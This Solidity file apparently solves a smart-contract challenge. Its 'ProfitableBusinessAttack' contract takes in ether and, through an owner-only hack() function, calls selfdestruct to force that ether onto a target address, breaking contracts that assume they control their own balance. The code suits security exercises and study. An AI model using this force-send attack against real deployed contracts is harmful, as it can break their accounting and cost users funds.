// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import './ProfitableBusiness.sol';

contract ProfitableBusinessAttack is Ownable {
    receive() external payable {}

    function hack(address payable mmm) external onlyOwner {
        selfdestruct(mmm);
    }
}
